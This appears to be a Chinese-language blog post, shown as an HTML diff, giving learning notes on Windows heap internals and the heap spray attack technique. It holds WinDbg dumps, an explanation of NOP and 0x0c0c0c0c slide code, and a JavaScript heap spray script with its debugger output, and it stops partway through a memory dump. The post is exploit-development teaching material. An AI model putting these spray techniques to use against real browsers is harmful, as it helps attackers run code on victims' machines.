@@ -1,0 +1,778 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Windows,Exploitation," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.2" />
+
+
+
+
+
+
+<meta name="description" content="堆喷射学习笔记0x01堆基础知识参考资料：WINDBG的堆调试–了解HEAP组织Windows堆的数据结构与管理策略1234567891011121314151617#include &quot;windows.h&quot;int main()&amp;#123;    HLOCAL h1, h2;    HANDLE hp;        hp = HeapCreate(0, 0x1000, 0x100000);">
+<meta name="keywords" content="Windows,Exploitation">
+<meta property="og:type" content="article">
+<meta property="og:title" content="learning notes of Heap Spray">
+<meta property="og:url" content="http://yoursite.com/2017/11/29/learning-notes-of-Heap-Spray/index.html">
+<meta property="og:site_name" content="aftern00n blog">
+<meta property="og:description" content="堆喷射学习笔记0x01堆基础知识参考资料：WINDBG的堆调试–了解HEAP组织Windows堆的数据结构与管理策略1234567891011121314151617#include &quot;windows.h&quot;int main()&amp;#123;    HLOCAL h1, h2;    HANDLE hp;        hp = HeapCreate(0, 0x1000, 0x100000);">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/img/learning%20notes%20of%20Heap%20Spray/0x02-1.png">
+<meta property="og:image" content="http://yoursite.com/img/learning%20notes%20of%20Heap%20Spray/0x02-2.png">
+<meta property="og:image" content="http://yoursite.com/img/learning%20notes%20of%20Heap%20Spray/0x02-3.png">
+<meta property="og:image" content="http://yoursite.com/img/learning%20notes%20of%20Heap%20Spray/0x02-4.png">
+<meta property="og:updated_time" content="2017-11-29T10:45:40.499Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="learning notes of Heap Spray">
+<meta name="twitter:description" content="堆喷射学习笔记0x01堆基础知识参考资料：WINDBG的堆调试–了解HEAP组织Windows堆的数据结构与管理策略1234567891011121314151617#include &quot;windows.h&quot;int main()&amp;#123;    HLOCAL h1, h2;    HANDLE hp;        hp = HeapCreate(0, 0x1000, 0x100000);">
+<meta name="twitter:image" content="http://yoursite.com/img/learning%20notes%20of%20Heap%20Spray/0x02-1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2017/11/29/learning-notes-of-Heap-Spray/"/>
+
+
+
+
+
+  <title>learning notes of Heap Spray | aftern00n blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">aftern00n blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/11/29/learning-notes-of-Heap-Spray/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="aftern00n">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="aftern00n blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">learning notes of Heap Spray</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-11-29T17:55:46+08:00">
+                2017-11-29
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Vulnerability/" itemprop="url" rel="index">
+                    <span itemprop="name">Vulnerability</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="堆喷射学习笔记"><a href="#堆喷射学习笔记" class="headerlink" title="堆喷射学习笔记"></a>堆喷射学习笔记</h1><h2 id="0x01堆基础知识"><a href="#0x01堆基础知识" class="headerlink" title="0x01堆基础知识"></a>0x01堆基础知识</h2><p>参考资料：<br><br><a href="http://www.cppblog.com/ay19880703/archive/2011/10/30/159364.html" target="_blank" rel="external">WINDBG的堆调试–了解HEAP组织</a><br><br><a href="http://www.doc88.com/p-9819325277293.html" target="_blank" rel="external">Windows堆的数据结构与管理策略</a><br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"windows.h"</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    HLOCAL h1, h2;</div><div class="line">    HANDLE hp;</div><div class="line">    </div><div class="line">    hp = HeapCreate(<span class="number">0</span>, <span class="number">0x1000</span>, <span class="number">0x100000</span>);</div><div class="line">    h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, <span class="number">0x120</span>*<span class="number">8</span><span class="number">-8</span>);</div><div class="line">    h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, <span class="number">0x100</span>*<span class="number">8</span><span class="number">-8</span>);</div><div class="line"></div><div class="line"></div><div class="line">    HeapFree(hp, <span class="number">0</span> , h1 ) ;</div><div class="line">    HeapFree(hp, <span class="number">0</span> , h2 ) ;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="number">0</span> ;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>调用HeapCreate创建了一个私有堆，返回的堆句柄就是堆的基地址。<br><br>私有堆的结构如下表所示：</p>
+<table><br>  <tr><br>    <td align="center"> HEAP </td><br>  </tr><br>  <tr><br>    <td align="center"> HEAP_SEGMENT </td><br>  </tr><br>  <tr><br>    <td align="center">HEAP BLOCK </td><br></tr></table>
+
+<p>堆的开始部分是Heap结构，其次是堆段（Heap_Segment）,然后是不同大小的堆块。堆块的结构我们比较熟知的，8字节的块首（HEAP_ENTRY）+数据区。</p>
+<table><br>  <tr><br>    <td align="center"> HEAP_ENTRY </td><br>  </tr><br>  <tr><br>    <td align="center"> 我们new或malloc分配的空间 </td><br>  </tr><br>  <tr><br>    <td align="center"> 填充空间 </td><br></tr></table>
+
+<p>我们new或者malloc返回的地址减去8字节即指向块首，第三部分的填充空间是为了保证堆块大小8字节对齐。以上面程序为例，介绍一下windbg查看这些结构的命令。</p>
+<table><br>  <tr><br>    <th width="50%">命令</th><br>    <th width="50%">说明</th><br>  </tr><br>  <tr><br>    <td> dt _HEAP address </td><br>    <td> 查看_HEAP结构 </td><br>  </tr><br>  <tr><br>    <td> dt _HEAP_SEGMENT segment_address </td><br>    <td> 查看HEAP_SEGMENT结构 </td><br>  </tr><tr><br>    <td> dt _HEAP_ENTRY address </td><br>    <td> 查看_HEAP_ENTRY结构 </td><br>  </tr><br>  <tr><br>    <td> dt _LIST_ENTRY address </td><br>    <td> 查看_LIST_ENTRY结构 </td><br>  </tr><br></table>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">0:000&gt; dt _heap 430000</div><div class="line">ntdll!_HEAP</div><div class="line">   +0x000 Entry            : _HEAP_ENTRY</div><div class="line">   +0x008 Signature        : 0xeeffeeff</div><div class="line">   +0x00c Flags            : 0x50001060</div><div class="line">   +0x010 ForceFlags       : 0x40000060</div><div class="line">   +0x014 VirtualMemoryThreshold : 0xfe00</div><div class="line">   +0x018 SegmentReserve   : 0x100000</div><div class="line">   +0x01c SegmentCommit    : 0x2000</div><div class="line">   +0x020 DeCommitFreeBlockThreshold : 0x200</div><div class="line">   +0x024 DeCommitTotalFreeThreshold : 0x2000</div><div class="line">   +0x028 TotalFreeSize    : 0x10c</div><div class="line">   +0x02c MaximumAllocationSize : 0x7ffdefff</div><div class="line">   +0x030 ProcessHeapsListIndex : 5</div><div class="line">   +0x032 HeaderValidateLength : 0x608</div><div class="line">   +0x034 HeaderValidateCopy : (null) </div><div class="line">   +0x038 NextAvailableTagIndex : 0</div><div class="line">   +0x03a MaximumTagIndex  : 0</div><div class="line">   +0x03c TagEntries       : (null) </div><div class="line">   +0x040 UCRSegments      : (null) </div><div class="line">   +0x044 UnusedUnCommittedRanges : 0x00430598 _HEAP_UNCOMMMTTED_RANGE</div><div class="line">   +0x048 AlignRound       : 0x17</div><div class="line">   +0x04c AlignMask        : 0xfffffff8</div><div class="line">   +0x050 VirtualAllocdBlocks : _LIST_ENTRY [ 0x430050 - 0x430050 ]</div><div class="line">   +0x058 Segments         : [64] 0x00430640 _HEAP_SEGMENT</div><div class="line">   +0x158 u                : __unnamed</div><div class="line">   +0x168 u2               : __unnamed</div><div class="line">   +0x16a AllocatorBackTraceIndex : 0</div><div class="line">   +0x16c NonDedicatedListLength : 1</div><div class="line">   +0x170 LargeBlocksIndex : (null) </div><div class="line">   +0x174 PseudoTagEntries : (null) </div><div class="line">   +0x178 FreeLists        : [128] _LIST_ENTRY [ 0x4317a8 - 0x4317a8 ]</div><div class="line">   +0x578 LockVariable     : 0x00430608 _HEAP_LOCK</div><div class="line">   +0x57c CommitRoutine    : (null) </div><div class="line">   +0x580 FrontEndHeap     : (null) </div><div class="line">   +0x584 FrontHeapLockCount : 0</div><div class="line">   +0x586 FrontEndHeapType : 0 &apos;&apos;</div><div class="line">   +0x587 LastSegmentIndex : 0 &apos;&apos;</div></pre></td></tr></table></figure>
+<p>重点关注偏移0x58和0x178两处，0x58处存储了堆段指针数组，可以看到一个堆中最多存储64个堆段。 0x178处的Free List则包括了所有空闲的Heap Block。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">0:000&gt; dt _heap_segment 430640</div><div class="line">ntdll!_HEAP_SEGMENT</div><div class="line">   +0x000 Entry            : _HEAP_ENTRY</div><div class="line">   +0x008 Signature        : 0xffeeffee</div><div class="line">   +0x00c Flags            : 0</div><div class="line">   +0x010 Heap             : 0x00430000 _HEAP</div><div class="line">   +0x014 LargestUnCommittedRange : 0xfe000</div><div class="line">   +0x018 BaseAddress      : 0x00430000 Void</div><div class="line">   +0x01c NumberOfPages    : 0x100</div><div class="line">   +0x020 FirstEntry       : 0x00430680 _HEAP_ENTRY</div><div class="line">   +0x024 LastValidEntry   : 0x00530000 _HEAP_ENTRY</div><div class="line">   +0x028 NumberOfUnCommittedPages : 0xfe</div><div class="line">   +0x02c NumberOfUnCommittedRanges : 1</div><div class="line">   +0x030 UnCommittedRanges : 0x00430588 _HEAP_UNCOMMMTTED_RANGE</div><div class="line">   +0x034 AllocatorBackTraceIndex : 0</div><div class="line">   +0x036 Reserved         : 0</div><div class="line">   +0x038 LastEntryInSegment : 0x004317a0 _HEAP_ENTRY</div></pre></td></tr></table></figure></p>
+<p>可以看到偏移0x20和0x38处，分别指向了堆段中的第一个和最后一个堆块。通过找到第一个堆块地址后，根据堆块的Size域，可以找到堆块二，即堆块一的地址+堆块一的字节数=堆块二的地址，重复这个过程，即可遍历堆段中的所有堆块。通过!heap -a address结果中的Granularity字段可以获取粒度值。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">0:000&gt; dt _heap_entry</div><div class="line">ntdll!_HEAP_ENTRY</div><div class="line">   +0x000 Size             : Uint2B //堆块的大小（以堆粒度为单位，含块首）</div><div class="line">   +0x002 PreviousSize     : Uint2B //前一堆块的大小（以堆粒度为单位，含块首）</div><div class="line">   +0x000 SubSegmentCode   : Ptr32 Void</div><div class="line">   +0x004 SmallTagIndex    : UChar</div><div class="line">   +0x005 Flags            : UChar //表示堆块的状态</div><div class="line">   +0x006 UnusedBytes      : UChar //堆块中未被用户使用的字节数（含块首）</div><div class="line">   +0x007 SegmentIndex     : UChar //堆块所在堆段的索引</div></pre></td></tr></table></figure></p>
+<p>Flags所代表的堆块状态：</p>
+<ul>
+<li>0x01: 堆块正在被程序或者堆管理器使用</li>
+<li>0x04：堆块使用了填充模式（File Pattern）</li>
+<li>0x08：堆块是直接从虚拟内存管理器中分配而来的</li>
+<li>0x10：堆块是未提交范围之前的最后一个堆块</li>
+</ul>
+<p>我们可以注意到，_HEAP和_HEAP_SEGMENT结构开始的8字节都是_HEAP_ENTRY结构：</p>
+<ul>
+<li>_HEAP结构本身是一个堆块，且它的下一个堆块是_HEAP_SEGMENT结构。</li>
+<li>_HEAP_SEGMENT结构本身也是一个堆块，并且_HEAP_SEGMENT结构中指出的堆段中的第一个堆块其实就是_HEAP_SEGMENT结构的下一个堆块。</li>
+</ul>
+<p>我整理的windbg中关于堆的常用命令：</p>
+<table><br>  <tr><br>    <th width="50%">命令</th><br>    <th width="50%">说明</th><br>  </tr><br>  <tr><br>    <td> !heap -h </td><br>    <td> 列出当前进程的所有堆 </td><br>  </tr><br>  <tr><br>    <td> !heap -v address </td><br>    <td> 观察堆的分配粒度和解除提交阈值 </td><br>  </tr><tr><br>    <td> !heap -a address </td><br>    <td> 获取更多详细信息 </td><br>  </tr><br>  <tr><br>    <td> !heap -stat </td><br>    <td> 显示进程堆信息 </td><br>  </tr><br>  <tr><br>    <td> !heap -stat -h address </td><br>    <td> 查看堆分配的统计数，不加address查看所有堆的 </td><br>  </tr><br>  <tr><br>    <td> !heap -p -a address </td><br>    <td> 获取address所属的堆 </td><br>  </tr><br>  <tr><br>    <td> !heap -flt s 0x8010 </td><br>    <td> 列出所有指定大小的分配块 </td><br>  </tr><br></table>
+
+<p>补充说一下，PEB结构体中偏移0x90处，存储了Heap的地址。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">0:000&gt; dt _PEB @$peb</div><div class="line">ntdll!_PEB</div><div class="line">   +0x018 ProcessHeap      : 0x00140000 Void  ;进程的默认堆</div><div class="line">   +0x068 NtGlobalFlag     : 0x70  ;这个标志位记录了当前堆调试模式,0为普通调试模式</div><div class="line">   +0x078 HeapSegmentReserve : 0x100000  ;进程在新建堆的时候默认申请的虚拟内存大小</div><div class="line">   +0x07c HeapSegmentCommit : 0x2000  ;进程在每次申请提交的虚拟内存大小，在提交的内存用完后，进程会又再一次提交HeapSegmentCommit中指定的内存大小</div><div class="line">   +0x080 HeapDeCommitTotalFreeThreshold : 0x10000  ;当释放的内存大小大于这个阀值，就进行内存解除提交操作</div><div class="line">   +0x084 HeapDeCommitFreeBlockThreshold : 0x1000  ;当一次性释放的块大小超过这个阀值，就进行内存解除提交操作</div><div class="line">   +0x088 NumberOfHeaps    : 5  ;当前进程的堆数目,这个数目对应着!heap命令的堆显示个数</div><div class="line">   +0x08c MaximumNumberOfHeaps : 0x10  ;进程所能运行的最大堆数目</div><div class="line">   +0x090 ProcessHeaps     : 0x7c99cfc0  -&gt; 0x00140000 Void  ;存储堆句柄的数组,这里我们可以得到进程的所有堆句柄</div><div class="line"></div><div class="line">0:000&gt; dd 0x7c99cfc0</div><div class="line">7c99cfc0  00140000 00240000 00250000 00380000</div><div class="line">7c99cfd0  00430000 00000000 00000000 00000000</div><div class="line">7c99cfe0  00000000 00000000 00000000 00000000</div><div class="line">7c99cff0  00000000 00000000 00000000 00000000</div><div class="line">7c99d000  02060204 00020498 00000001 7c9b3000</div></pre></td></tr></table></figure></p>
+<h2 id="0x02堆喷射原理"><a href="#0x02堆喷射原理" class="headerlink" title="0x02堆喷射原理"></a>0x02堆喷射原理</h2><p>参考资料:<br><br><a href="http://blog.csdn.net/magictong/article/details/7391397" target="_blank" rel="external">Heapy Spray原理浅析</a><br><br><a href="http://www.exploit-monday.com/2011/08/targeted-heap-spraying-0x0c0c0c0c-is.html" target="_blank" rel="external">Targeted Heap Spraying – 0x0c0c0c0c is a Thing of the Past</a><br><br>Exploit 编写系列教程第十一篇：堆喷射技术揭秘（上）</p>
+<h3 id="应用程序内存模型"><a href="#应用程序内存模型" class="headerlink" title="应用程序内存模型"></a>应用程序内存模型</h3><p>要理解堆喷的原理，首先需要弄清楚一个应用程序在系统里面运行之后，它的虚拟内存结构是什么样的。从windows95开始，windows操作系统就开始构建在平坦内存模型上面，该模型在32位系统上总共提供了4GB的可寻址空间。一般来讲，顶层的一半（0x80000000-0xFFFFFFFF）被保留用做内核空间（NT系统），这种划分是可以修改的。而低地址的0x00000000-0x7FFFFFFF里面，前64K与后64K都是不可以使用的（前64K估计是为了兼容DOS程序或者设置NULL指针而保留，严禁进程访问，后64K用于隔离进程的用户和内核空间），因此进程可用的区域就为0x00010000-0x7FFEFFFF。为了进一步简化程序员的编程工作，Windows操作系统通过虚拟寻址来管理内存。从本质上来说，虚拟内存模型为每个运行中的进程提供了它自己的4GB虚拟地址空间。这项工作是通过一个从虚拟地址到物理地址的转换来完成的，并且是在一个内存管理单元（Memory Management Unit，MMU）的帮助下完成的。<br><br><img src="/img/learning notes of Heap Spray/0x02-1.png" alt="Heap Spray"></p>
+<h3 id="堆喷射基本思路"><a href="#堆喷射基本思路" class="headerlink" title="堆喷射基本思路"></a>堆喷射基本思路</h3><p>Heap Spray是一种攻击方法，一般通过在shellcode的前面加上大量的slide code（滑板指令），组成一个注入代码段。然后向系统申请大量内存，并且反复用注入代码段来填充。这样就使得进程的地址空间被大量的注入代码所占据。然后结合其他的漏洞攻击技术控制程序流，使得程序执行到堆上，最终将导致shellcode的执行。由于堆的起始地址是很低的，当申请大量内存的时候，堆很有可能覆盖到0x0A0A0A0A（160M），0x0C0C0C0C（192M），0x0D0D0D0D（208M）这几个地址，这也是为啥经常会看到exp中控制eip到0x0c0c0c0c。</p>
+<h3 id="滑板指令（slidecode）选取"><a href="#滑板指令（slidecode）选取" class="headerlink" title="滑板指令（slidecode）选取"></a>滑板指令（slidecode）选取</h3><p>首先需要明确的是为什么需要在shellcode前面加上滑板指令,而不是整个都填充为shellcode。如果要想shellcode执行成功，必须要准确命中shellcode的第一条指令，如果整个进程空间都是shellcode，反而精确命中shellcode的概率大大降低了（概率接近0%），加上滑板指令之后，只要命中滑板指令就可以保证shellcode执行成功了，一般shellcode的指令的总长度在50个字节左右，而滑板指令的长度则大约是100万字节（按每块分配1M计算），那么现在命中的概率就接近99.99%了。因为现在命中的是滑板指令，那么执行滑板指令的结果也不能影响和干扰shellcode，因此以前的做法是使用NOP（0x90）指令来填充，譬如可以把函数指针地址或者return地址覆盖为0x0C0C0C0C，这样调用这个函数或函数返回后就转到shellcode去执行了。不过现在为了绕过操作系统的一些安全保护，使用较多的攻击技术是覆盖虚函数指针（这是一个多级指针），这种情况下，slidecode选取就比较讲究了，如果你依然使用0x90来做slidecode，而用0x0C0C0C0C去覆盖虚函数指针，那么现在的虚表（假虚表）里面全是0x90909090，程序跑到0x90909090（内核空间）去执行，直接就crash了。这里我们可以用0x0c0c0c0c来作滑板指令，机器码0C0C对应的x86汇编指令是or al, 0c，这些指令仅仅会影响到al寄存器的值，对执行我们的ShellCode没有任何影响。<br><br><img src="/img/learning notes of Heap Spray/0x02-2.png" alt="Heap Spray"></p>
+<h3 id="Heap-Spray脚本"><a href="#Heap-Spray脚本" class="headerlink" title="Heap Spray脚本"></a>Heap Spray脚本</h3><p>通过前面所讲，构造堆喷的条件就是申请大量内存，这里我们先利用脚本分配200块0x1000(4096字节)大小的内存块。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span> &gt;</span><span class="undefined"></span></div><div class="line"><span class="undefined">tag = unescape('%u4F43%u4552'); // CORE</span></div><div class="line"><span class="undefined">tag += unescape('%u414C%u214E'); // LAN!</span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="undefined">chunk = '';</span></div><div class="line"><span class="undefined">chunksize = 0x1000;</span></div><div class="line"><span class="undefined">nr_of_chunks = 200;</span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="undefined">for ( counter = 0; counter &lt; chunksize; counter++)</span></div><div class="line"><span class="undefined">&#123;</span></div><div class="line"><span class="undefined">    chunk += unescape('%u9090%u9090');  //nops</span></div><div class="line"><span class="undefined">&#125;</span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="xml">document.write("size of NOPS at this point : " + chunk.length.toString() + "<span class="tag">&lt;<span class="name">br</span>&gt;</span>");</span></div><div class="line"><span class="undefined">chunk = chunk.substring(0,chunksize - tag.length);</span></div><div class="line"><span class="xml">document.write("size of NOPS after substring : " + chunk.length.toString() + "<span class="tag">&lt;<span class="name">br</span>&gt;</span>");</span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="undefined">// create the array</span></div><div class="line"><span class="undefined">testarray = new Array();</span></div><div class="line"><span class="undefined">for ( counter = 0; counter &lt; nr_of_chunks; counter++)</span></div><div class="line"><span class="undefined">&#123;</span></div><div class="line"><span class="undefined">    testarray[counter] = tag + chunk;</span></div><div class="line"><span class="xml">    document.write("Allocated " + (tag.length+chunk.length).toString() + " bytes <span class="tag">&lt;<span class="name">br</span>&gt;</span>");</span></div><div class="line"><span class="undefined">&#125;</span></div><div class="line"><span class="undefined">alert("Spray done")</span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<p>首先要说明两点：<br><br>1、unescape()对象返回的长度是实际大小的一半，例如该代码中：tag变量长度是8字节，但通过tag.length得到的长度是4字节。<br><br>2、js中，当分配一个字符串时，它会变成BSTR字符串对象。该对象包含4字节的头部信息（指明字符串的长度）和结束符（两个NULL字节）。<br><br><img src="/img/learning notes of Heap Spray/0x02-3.png" alt="Heap Spray"><br>通过搜索字符串”CORELAN!”可以找到201个地址：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">0:008&gt; s -a 000000 L?7fffffff &quot;CORELAN!&quot;</div></pre></td></tr></table></figure></p>
+<p>我们可以看到两个字符串”CORELAN!”地址之间除了我们申请的0x2000字节，还存在一些垃圾数据。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">02b17d7c 90909090 90909090 90909090 90909090 90909090 90909090 90909090</div><div class="line">02b17d98 90909090 90909090 90909090 90909090 90909090 90909090 90909090</div><div class="line">02b17db4 90909090 90909090 90909090 90909090 90909090 90909090 90909090</div><div class="line">02b17dd0 90909090 90909090 90909090 00000000 00000000 00000000 00000000</div><div class="line">02b17dec 00000000 00000000 00000000 00000000 00000000 00000000 00000000</div><div class="line">02b17e08 00000000 00000000 00000000 00000000 00000000 00000000 00000000</div><div class="line">02b17e24 00000000 00000000 00000000 00000000 00000000 00000000 00000000</div><div class="line">02b17e40 00000000 00000000 00000000 00000000 00000000 00000000 00000000</div><div class="line">02b17e5c 00000000 00000000 00000000 00000000 00000000 00000000 00000000</div><div class="line">02b17e78 00000000 00000000 00000000 00000000 00000000 00000000 00000000</div><div class="line">02b17e94 00000000 00000000 00000000 00000000 00000000 00000000 00000000</div><div class="line">02b17eb0 00000000 00000000 00000000 00000000 00000000 00000000 